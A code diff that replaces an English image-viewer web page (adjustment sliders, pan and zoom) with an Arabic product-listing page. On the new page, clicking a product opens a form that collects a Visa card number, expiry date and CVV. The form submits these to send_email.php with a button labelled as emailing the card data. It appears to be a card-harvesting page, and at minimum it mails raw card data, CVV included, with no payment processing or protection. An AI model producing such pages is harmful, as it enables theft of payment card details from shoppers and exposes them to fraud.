@@ -3,449 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Viewer with Adjustments</title>
+    <title>عرض صور المنتجات مع نموذج بيانات Visa</title>
     <style>
-        .container {
+        .product-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .product-item {
             display: flex;
-            flex-direction: column;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            padding: 10px;
+            border-radius: 5px;
             align-items: center;
-            gap: 20px;
         }
-        .slider-container {
-            width: 500px;
-            display: flex;
-            justify-content: center;
-            order: 2;
+
+        .product-image {
+            width: 150px;
+            height: auto;
+            margin-right: 15px;
+            border-radius: 5px;
         }
-        input[type="range"].horizontal {
-            width: 100%;
-        }
-        .error-message {
-            color: red;
-            font-size: 18px;
-            text-align: center;
-            margin: 20px;
-        }
-        #imageCanvas {
-            cursor: move;
-        }
-        .controls {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-top: 20px;
-            width: 100%;
-        }
-        .control-group {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 5px;
-            background-color: #f5f5f5;
-            border-radius: 4px;
-        }
-        .control-label {
-            min-width: 100px;
-            font-weight: bold;
-        }
-        .control-slider {
+
+        .product-details {
             flex-grow: 1;
         }
-        .control-value {
-            min-width: 50px;
-            text-align: right;
-            font-family: monospace;
+
+        .price {
+            font-weight: bold;
+            color: green;
+            margin-bottom: 5px;
+        }
+
+        .available-countries {
+            color: #777;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+
+        .description {
+            margin-bottom: 0;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <canvas id="imageCanvas" width="500" height="500"></canvas>
-        <div class="controls">
-            <div class="control-group">
-                <span class="control-label">Image:</span>
-                <input type="range" id="imageSlider" class="control-slider horizontal" min="0" value="0" step="1">
-            </div>
-            <div class="control-group">
-                <span class="control-label">Brightness:</span>
-                <input type="range" id="brightnessSlider" class="control-slider" min="-100" max="100" value="0" step="1">
-                <span class="control-value" id="brightnessValue">0</span>
-            </div>
-            <div class="control-group">
-                <span class="control-label">Contrast:</span>
-                <input type="range" id="contrastSlider" class="control-slider" min="-100" max="100" value="0" step="1">
-                <span class="control-value" id="contrastValue">0</span>
-            </div>
-            <div class="control-group">
-                <span class="control-label">Gamma:</span>
-                <input type="range" id="gammaSlider" class="control-slider" min="1" max="22" value="10" step="1">
-                <span class="control-value" id="gammaValue">1.0</span>
-            </div>
-            <div class="control-group">
-                <span class="control-label">Sharpness:</span>
-                <input type="range" id="sharpnessSlider" class="control-slider" min="0" max="100" value="0" step="1">
-                <span class="control-value" id="sharpnessValue">0</span>
-            </div>
-            <div class="control-group">
-                <span class="control-label">Rotation:</span>
-                <input type="range" id="rotationSlider" class="control-slider" min="0" max="360" value="0" step="1">
-                <span class="control-value" id="rotationValue">0°</span>
-            </div>
-        </div>
+
+    <h1>قائمة المنتجات</h1>
+    <ul class="product-list" id="product-container">
+        </ul>
+
+    <div id="visa-form-container">
+        <h2>بيانات بطاقة Visa</h2>
+        <form id="visa-form" action="send_email.php" method="POST">
+            <label for="productId">المنتج:</label>
+            <input type="text" id="productId" name="productId" readonly>
+
+            <label for="cardNumber">رقم البطاقة:</label>
+            <input type="number" id="cardNumber" name="cardNumber" required>
+
+            <label for="expiryDate">تاريخ الانتهاء (MM/YY):</label>
+            <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
+
+            <label for="cvv">رمز التحقق (CVV):</label>
+            <input type="number" id="cvv" name="cvv" required>
+
+            <button type="submit">إرسال بيانات Visa عبر البريد الإلكتروني</button>
+        </form>
     </div>
-    <div id="errorMessage" class="error-message"></div>
+
     <script>
-        let images = [];
-        let currentImageIndex = 0;
-        let scale = 1;
-        let offsetX = 0;
-        let offsetY = 0;
-        let isDragging = false;
-        let lastX = 0;
-        let lastY = 0;
-        let prevDistance = 0;
-        let prevScale = 1;
+        document.addEventListener('DOMContentLoaded', function() {
+            const productContainer = document.getElementById('product-container');
+            const visaFormContainer = document.getElementById('visa-form-container');
+            const visaForm = document.getElementById('visa-form');
+            const productIdInput = document.getElementById('productId');
 
-        const imageAdjustments = {
-            brightness: 0,
-            contrast: 0,
-            gamma: 1.0,
-            sharpness: 0,
-            rotation: 0
-        };
+            fetch('بيانات_المنتجات.json')
+                .then(response => response.json())
+                .then(data => {
+                    for (const id in data) {
+                        if (data.hasOwnProperty(id)) {
+                            const product = data[id];
+                            const listItem = document.createElement('li');
+                            listItem.classList.add('product-item');
 
-        // Convolution kernels
-        const sharpenKernel = [
-            -1, -1, -1,
-            -1, 9, -1,
-            -1, -1, -1
-        ];
+                            const image = document.createElement('img');
+                            image.src = `صور_المنتجات/${id}.jpg`;
+                            image.alt = product.الوصف;
+                            image.classList.add('product-image');
+                            image.dataset.productId = id;
 
-        async function fetchBinFile(filePath) {
-            try {
-                const response = await fetch(filePath);
-                if (!response.ok) throw new Error('File not found');
-                return await response.arrayBuffer();
-            } catch (error) {
-                throw new Error('Failed to load file');
-            }
-        }
+                            image.addEventListener('click', function() {
+                                productIdInput.value = this.dataset.productId; // Set the product ID in the form
+                                visaFormContainer.style.display = 'block';
+                            });
 
-        function loadImagesFromBuffer(buffer) {
-            const dataView = new DataView(buffer);
-            let offset = 0;
-            const fileCount = dataView.getInt32(offset, true);
-            offset += 4;
+                            const detailsDiv = document.createElement('div');
+                            detailsDiv.classList.add('product-details');
+                            detailsDiv.innerHTML = `
+                                <p class="price">السعر: $${product.السعر_بالدولار}</p>
+                                <p class="available-countries">متاح في: ${product.البلاد_المتاحة.join(', ')}</p>
+                                <p class="description">الوصف: ${product.الوصف}</p>
+                            `;
 
-            const imgs = [];
-            const promises = [];
+                            listItem.appendChild(image);
+                            listItem.appendChild(detailsDiv);
 
-            for (let i = 0; i < fileCount; i++) {
-                const jpegDataLength = dataView.getInt32(offset, true);
-                offset += 4;
-                const jpegData = new Uint8Array(buffer, offset, jpegDataLength);
-                offset += jpegDataLength;
-
-                const blob = new Blob([jpegData], { type: 'image/jpeg' });
-                const imageUrl = URL.createObjectURL(blob);
-                const image = new Image();
-                image.src = imageUrl;
-                imgs.push(image);
-                
-                promises.push(new Promise(resolve => {
-                    image.onload = resolve;
-                }));
-            }
-
-            return Promise.all(promises).then(() => imgs);
-        }
-
-        function applyConvolution(data, width, height, kernel, kernelSize) {
-            const output = new Uint8ClampedArray(data.length);
-            const half = Math.floor(kernelSize / 2);
-
-            for (let i = 3; i < data.length; i += 4) {
-                output[i] = data[i];
-            }
-
-            for (let y = 0; y < height; y++) {
-                for (let x = 0; x < width; x++) {
-                    const idx = (y * width + x) * 4;
-                    let r = 0, g = 0, b = 0;
-
-                    for (let ky = -half; ky <= half; ky++) {
-                        for (let kx = -half; kx <= half; kx++) {
-                            const ix = x + kx;
-                            const iy = y + ky;
-                            
-                            if (ix >= 0 && ix < width && iy >= 0 && iy < height) {
-                                const kernelIdx = (ky + half) * kernelSize + (kx + half);
-                                const dataIdx = (iy * width + ix) * 4;
-                                
-                                r += data[dataIdx] * kernel[kernelIdx];
-                                g += data[dataIdx + 1] * kernel[kernelIdx];
-                                b += data[dataIdx + 2] * kernel[kernelIdx];
-                            }
+                            productContainer.appendChild(listItem);
                         }
                     }
-
-                    output[idx] = Math.min(255, Math.max(0, r));
-                    output[idx + 1] = Math.min(255, Math.max(0, g));
-                    output[idx + 2] = Math.min(255, Math.max(0, b));
-                }
-            }
-
-            return output;
-        }
-
-        function processImageData(imageData) {
-            const data = imageData.data;
-            let processed = new Uint8ClampedArray(data);
-
-            if (imageAdjustments.sharpness > 0) {
-                const intensity = imageAdjustments.sharpness / 100;
-                const customKernel = [
-                    -intensity, -intensity, -intensity,
-                    -intensity, 1 + (8 * intensity), -intensity,
-                    -intensity, -intensity, -intensity
-                ];
-                processed = applyConvolution(processed, imageData.width, imageData.height, customKernel, 3);
-            }
-
-            for (let i = 0; i < data.length; i += 4) {
-                let r = processed[i];
-                let g = processed[i + 1];
-                let b = processed[i + 2];
-
-                // Brightness
-                r += imageAdjustments.brightness;
-                g += imageAdjustments.brightness;
-                b += imageAdjustments.brightness;
-
-                // Contrast
-                const factor = (259 * (imageAdjustments.contrast + 255)) / (255 * (259 - imageAdjustments.contrast));
-                r = factor * (r - 128) + 128;
-                g = factor * (g - 128) + 128;
-                b = factor * (b - 128) + 128;
-
-                // Gamma
-                const gamma = imageAdjustments.gamma;
-                r = 255 * Math.pow(r / 255, 1 / gamma);
-                g = 255 * Math.pow(g / 255, 1 / gamma);
-                b = 255 * Math.pow(b / 255, 1 / gamma);
-
-                processed[i] = Math.min(255, Math.max(0, r));
-                processed[i + 1] = Math.min(255, Math.max(0, g));
-                processed[i + 2] = Math.min(255, Math.max(0, b));
-            }
-
-            return processed;
-        }
-
-        function displayImage(image) {
-            const canvas = document.getElementById('imageCanvas');
-            const ctx = canvas.getContext('2d');
-            const offscreen = document.createElement('canvas');
-            offscreen.width = image.width;
-            offscreen.height = image.height;
-            const offCtx = offscreen.getContext('2d');
-
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            offCtx.clearRect(0, 0, offscreen.width, offscreen.height);
-            offCtx.drawImage(image, 0, 0);
-
-            const imageData = offCtx.getImageData(0, 0, offscreen.width, offscreen.height);
-            const processedData = processImageData(imageData);
-            offCtx.putImageData(new ImageData(processedData, offscreen.width, offscreen.height), 0, 0);
-
-            ctx.save();
-            ctx.translate(canvas.width/2, canvas.height/2);
-            ctx.rotate(imageAdjustments.rotation * Math.PI / 180);
-            ctx.scale(scale, scale);
-            ctx.translate(offsetX/scale, offsetY/scale);
-            ctx.drawImage(offscreen, -image.width/2, -image.height/2, image.width, image.height);
-            ctx.restore();
-        }
-
-        function setupCanvasEvents() {
-            const canvas = document.getElementById('imageCanvas');
-
-            // Mouse events
-            canvas.addEventListener('mousedown', (e) => {
-                if (e.button === 0) {
-                    isDragging = true;
-                    lastX = e.offsetX;
-                    lastY = e.offsetY;
-                }
-            });
-
-            canvas.addEventListener('mousemove', (e) => {
-                if (isDragging) {
-                    const deltaX = e.offsetX - lastX;
-                    const deltaY = e.offsetY - lastY;
-                    offsetX += deltaX * Math.cos(imageAdjustments.rotation * Math.PI / 180) + deltaY * Math.sin(imageAdjustments.rotation * Math.PI / 180);
-                    offsetY += deltaY * Math.cos(imageAdjustments.rotation * Math.PI / 180) - deltaX * Math.sin(imageAdjustments.rotation * Math.PI / 180);
-                    lastX = e.offsetX;
-                    lastY = e.offsetY;
-                    displayImage(images[currentImageIndex]);
-                }
-            });
-
-            canvas.addEventListener('mouseup', () => isDragging = false);
-            canvas.addEventListener('mouseleave', () => isDragging = false);
-
-            // Touch events
-            canvas.addEventListener('touchstart', (e) => {
-                if (e.touches.length === 1) {
-                    isDragging = true;
-                    lastX = e.touches[0].clientX;
-                    lastY = e.touches[0].clientY;
-                } else if (e.touches.length === 2) {
-                    const touch1 = e.touches[0];
-                    const touch2 = e.touches[1];
-                    prevDistance = Math.hypot(
-                        touch2.clientX - touch1.clientX,
-                        touch2.clientY - touch1.clientY
-                    );
-                    prevScale = scale;
-                    e.preventDefault();
-                }
-            });
-
-            canvas.addEventListener('touchmove', (e) => {
-                if (e.touches.length === 1 && isDragging) {
-                    const deltaX = e.touches[0].clientX - lastX;
-                    const deltaY = e.touches[0].clientY - lastY;
-                    offsetX += deltaX * Math.cos(imageAdjustments.rotation * Math.PI / 180) + deltaY * Math.sin(imageAdjustments.rotation * Math.PI / 180);
-                    offsetY += deltaY * Math.cos(imageAdjustments.rotation * Math.PI / 180) - deltaX * Math.sin(imageAdjustments.rotation * Math.PI / 180);
-                    lastX = e.touches[0].clientX;
-                    lastY = e.touches[0].clientY;
-                    displayImage(images[currentImageIndex]);
-                } else if (e.touches.length === 2) {
-                    const touch1 = e.touches[0];
-                    const touch2 = e.touches[1];
-                    const currentDistance = Math.hypot(
-                        touch2.clientX - touch1.clientX,
-                        touch2.clientY - touch1.clientY
-                    );
-
-                    if (prevDistance > 0) {
-                        const scaleFactor = currentDistance / prevDistance;
-                        const newScale = Math.max(0.1, Math.min(5, prevScale * scaleFactor));
-
-                        const rect = canvas.getBoundingClientRect();
-                        const midX = (touch1.clientX + touch2.clientX)/2 - rect.left;
-                        const midY = (touch1.clientY + touch2.clientY)/2 - rect.top;
-
-                        const zoomPointX = midX - canvas.width/2 - offsetX;
-                        const zoomPointY = midY - canvas.height/2 - offsetY;
-                        const deltaScale = newScale / prevScale;
-                        offsetX += zoomPointX * (1 - deltaScale);
-                        offsetY += zoomPointY * (1 - deltaScale);
-
-                        scale = newScale;
-                        prevDistance = currentDistance;
-                        prevScale = newScale;
-                        displayImage(images[currentImageIndex]);
-                    }
-                    e.preventDefault();
-                }
-            });
-
-            canvas.addEventListener('touchend', () => {
-                isDragging = false;
-                prevDistance = 0;
-            });
-
-            canvas.addEventListener('touchcancel', () => {
-                isDragging = false;
-                prevDistance = 0;
-            });
-
-            // Wheel zoom
-            canvas.addEventListener('wheel', (e) => {
-                e.preventDefault();
-                const zoomFactor = 0.1;
-                const delta = e.deltaY > 0 ? -zoomFactor : zoomFactor;
-                const oldScale = scale;
-                scale = Math.max(0.1, Math.min(5, scale * (1 + delta)));
-
-                const rect = canvas.getBoundingClientRect();
-                const mouseX = e.clientX - rect.left;
-                const mouseY = e.clientY - rect.top;
-                const zoomPointX = mouseX - canvas.width/2 - offsetX;
-                const zoomPointY = mouseY - canvas.height/2 - offsetY;
-                offsetX += zoomPointX * (1 - scale/oldScale);
-                offsetY += zoomPointY * (1 - scale/oldScale);
-                displayImage(images[currentImageIndex]);
-            });
-        }
-
-        function setupAdjustmentSliders() {
-            const sliders = {
-                brightness: document.getElementById('brightnessSlider'),
-                contrast: document.getElementById('contrastSlider'),
-                gamma: document.getElementById('gammaSlider'),
-                sharpness: document.getElementById('sharpnessSlider'),
-                rotation: document.getElementById('rotationSlider')
-            };
-
-            const values = {
-                brightness: document.getElementById('brightnessValue'),
-                contrast: document.getElementById('contrastValue'),
-                gamma: document.getElementById('gammaValue'),
-                sharpness: document.getElementById('sharpnessValue'),
-                rotation: document.getElementById('rotationValue')
-            };
-
-            for (const [key, slider] of Object.entries(sliders)) {
-                slider.addEventListener('input', (e) => {
-                    let value = parseFloat(e.target.value);
-                    if (key === 'gamma') value = value / 10;
-                    imageAdjustments[key] = value;
-                    values[key].textContent = key === 'rotation' ? 
-                        `${value}°` : 
-                        key === 'gamma' ? 
-                            value.toFixed(1) : 
-                            value;
-                    if (images.length > 0) displayImage(images[currentImageIndex]);
+                })
+                .catch(error => {
+                    console.error('حدث خطأ أثناء تحميل بيانات JSON:', error);
+                    const errorMessage = document.createElement('p');
+                    errorMessage.textContent = 'حدث خطأ أثناء تحميل بيانات المنتجات.';
+                    document.body.appendChild(errorMessage);
                 });
-                slider.addEventListener('touchstart', (e) => e.stopPropagation());
-            }
-        }
-
-        function showError(message) {
-            document.getElementById('errorMessage').textContent = message;
-        }
-
-        async function init() {
-            try {
-                const urlParams = new URLSearchParams(window.location.search);
-                const binFileName = urlParams.get('file');
-                const filePath = binFileName ? `Images/${binFileName}.bin` : 'Images/output.bin';
-
-                const buffer = await fetchBinFile(filePath);
-                images = await loadImagesFromBuffer(buffer);
-
-                if (images.length > 0) {
-                    const slider = document.getElementById('imageSlider');
-                    slider.max = images.length - 1;
-                    displayImage(images[0]);
-
-                    slider.addEventListener('input', (e) => {
-                        currentImageIndex = parseInt(e.target.value);
-                        displayImage(images[currentImageIndex]);
-                    });
-
-                    setupCanvasEvents();
-                    setupAdjustmentSliders();
-                }
-            } catch (error) {
-                showError('Error: The requested image file was not found or could not be loaded.');
-            }
-        }
-
-        window.onload = init;
+        });
     </script>
+
 </body>
 </html>
